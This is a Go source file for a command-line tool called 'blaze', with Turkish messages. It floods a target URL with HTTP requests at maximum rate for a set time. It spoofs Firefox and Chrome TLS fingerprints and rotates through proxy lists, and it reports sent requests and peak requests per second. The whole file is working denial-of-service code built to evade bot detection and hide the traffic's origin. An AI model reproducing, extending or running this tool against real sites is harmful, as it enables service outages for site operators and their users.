package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya]")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET proxies.txt")
		fmt.Println()
		fmt.Println("her iki browser (firefox+chrome) ayni anda kullanilir")
		fmt.Println()
		fmt.Println("proxy dosya formati (satir satir):")
		fmt.Println("  ip:port")
		fmt.Println("  ip:port:user:pass")
		fmt.Println("  socks5://ip:port")
		fmt.Println("  http://user:pass@ip:port")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	if len(os.Args) >= 5 {
		streams = mustInt(os.Args[4], "stream")
	}

	method := "GET"
	if len(os.Args) >= 6 {
		method = strings.ToUpper(os.Args[5])
	}

	proxyArg := ""
	if len(os.Args) >= 7 {
		proxyArg = os.Args[6]
	}

	run(targetURL, durSec, threads, streams, method, proxyArg)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg string) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Pipeline workers = threads * streams (total concurrency)
	totalWorkers := threads * streams

	idlePerHost := totalWorkers
	if idlePerHost < 256 {
		idlePerHost = 256
	}
	totalIdle := totalWorkers * 2
	if totalIdle < 512 {
		totalIdle = 512
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(totalIdle),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	// Detect proxy mode
	var proxyRotator *gofire.ProxyRotator
	if proxyArg != "" {
		if isProxyFile(proxyArg) {
			var err error
			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
				os.Exit(1)
			}
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	// Create both Firefox and Chrome clients
	firefoxClient, err := gofire.Emulate(gofire.Firefox148, baseOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "hata: firefox client olusturulamadi: %v\n", err)
		os.Exit(1)
	}
	defer firefoxClient.Close()

	chromeClient, err := gofire.Emulate(gofire.Chrome146, baseOpts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "hata: chrome client olusturulamadi: %v\n", err)
		os.Exit(1)
	}
	defer chromeClient.Close()

	if proxyRotator != nil {
		firefoxClient.SetProxyRotator(proxyRotator)
		chromeClient.SetProxyRotator(proxyRotator)
	}

	// Split workers: half Firefox, half Chrome
	firefoxWorkers := totalWorkers / 2
	chromeWorkers := totalWorkers - firefoxWorkers

	fmt.Printf("hedef: %s | sure: %ds | worker: %d | method: %s\n",
		targetURL, durSec, totalWorkers, method)
	fmt.Printf("browser: firefox=%d worker + chrome=%d worker (pipeline)\n", firefoxWorkers, chromeWorkers)
	if proxyRotator != nil {
		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
	} else if proxyArg != "" {
		fmt.Printf("proxy: %s\n", proxyArg)
	}

	// Test both browsers
	for _, tc := range []struct {
		name   string
		client *gofire.Client
	}{
		{"firefox", firefoxClient},
		{"chrome", chromeClient},
	} {
		fmt.Printf("test [%s]... ", tc.name)
		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
		resp, testErr := tc.client.DoWithContext(testCtx, method, targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Printf("BASARISIZ: %v\n", testErr)
		} else {
			fmt.Printf("OK %d\n", resp.StatusCode())
			resp.Close()
		}
	}

	// Pre-warm both
	fmt.Print("baglanti isitiliyor... ")
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	warmCount := totalWorkers / 8
	if warmCount < 4 {
		warmCount = 4
	}
	if warmCount > 64 {
		warmCount = 64
	}
	_ = firefoxClient.PreConnect(warmCtx, targetURL, warmCount)
	_ = chromeClient.PreConnect(warmCtx, targetURL, warmCount)
	warmCancel()
	fmt.Printf("%d baglanti\n", firefoxClient.ActiveConnections()+chromeClient.ActiveConnections())

	// Create pipelines
	firefoxPipeline := firefoxClient.NewPipeline(firefoxWorkers)
	defer firefoxPipeline.Close()

	chromePipeline := chromeClient.NewPipeline(chromeWorkers)
	defer chromePipeline.Close()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\ndurduruluyor...")
		cancel()
	}()

	var (
		totalSent    atomic.Int64
		totalSuccess atomic.Int64
		totalFailed  atomic.Int64
		statusCodes  sync.Map
		errMu        sync.Mutex
		recentErrs   []string
		errCountMap  sync.Map
	)

	startTime := time.Now()
	fmt.Printf("basliyor... %d pipeline worker (firefox+chrome)\n\n", totalWorkers)

	// Feed pipelines continuously from feeder goroutines.
	// Each feeder sends jobs as fast as the pipeline can consume.
	// The pipeline's buffered channel provides backpressure.
	var feedWg sync.WaitGroup

	// Result collector: reads results from pipeline and updates stats
	collectResult := func(result *gofire.PipelineResult) {
		totalSent.Add(1)
		if result.Err != nil {
			totalFailed.Add(1)

			errStr := result.Err.Error()
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 5 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		} else {
			totalSuccess.Add(1)
			if result.Response != nil {
				sc := result.Response.StatusCode()
				val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
				val.(*atomic.Int64).Add(1)
				result.Response.Close()
			}
		}
	}

	// Feeder function: sends jobs to pipeline, collects results
	feedPipeline := func(pipeline *gofire.Pipeline, name string) {
		defer feedWg.Done()

		for {
			select {
			case <-ctx.Done():
				return
			default:
			}

			ch := pipeline.Send(ctx, method, targetURL, nil, nil)

			// Non-blocking collect in a separate goroutine would add overhead.
			// Instead collect inline - the pipeline buffer handles backpressure.
			select {
			case result := <-ch:
				collectResult(result)
			case <-ctx.Done():
				return
			}
		}
	}

	// Launch feeders: multiple feeders per pipeline to keep it saturated.
	// Each feeder is sequential (send → collect → repeat), so we need
	// enough feeders to keep the pipeline's buffered channel full.
	feedersPerPipeline := runtime.NumCPU()
	if feedersPerPipeline < 4 {
		feedersPerPipeline = 4
	}

	for i := 0; i < feedersPerPipeline; i++ {
		feedWg.Add(1)
		go feedPipeline(firefoxPipeline, "firefox")
	}
	for i := 0; i < feedersPerPipeline; i++ {
		feedWg.Add(1)
		go feedPipeline(chromePipeline, "chrome")
	}

	// Stats printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				ok := totalSuccess.Load()
				fail := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()

				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d peak:%d %.0fs   ",
					sent, ok, fail, rps, peakRPS, elapsed)
			}
		}
	}()

	feedWg.Wait()

	totalDuration := time.Since(startTime)
	sent := totalSent.Load()
	ok := totalSuccess.Load()
	fail := totalFailed.Load()

	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(sent) / totalDuration.Seconds()
	}
	successRate := float64(0)
	if sent > 0 {
		successRate = float64(ok) / float64(sent) * 100
	}

	totalConns := firefoxClient.ActiveConnections() + chromeClient.ActiveConnections()

	fmt.Printf("\n\n--- sonuclar ---\n")
	fmt.Printf("gonderilen: %d\n", sent)
	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
	fmt.Printf("basarisiz:  %d\n", fail)
	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
	fmt.Printf("baglanti:   %d (firefox+chrome)\n", totalConns)

	hasStatus := false
	statusCodes.Range(func(key, value interface{}) bool {
		if !hasStatus {
			fmt.Println("\nstatus kodlari:")
			hasStatus = true
		}
		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
		return true
	})

	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println("\nhatalar:")
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("  [%dx] %s\n", count, e)
		}
	}
	errMu.Unlock()

	fmt.Println()
}

// isProxyFile checks if the argument is a file path (vs a proxy URL).
func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
		return true
	}
	return false
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
		os.Exit(1)
	}
	return v
}
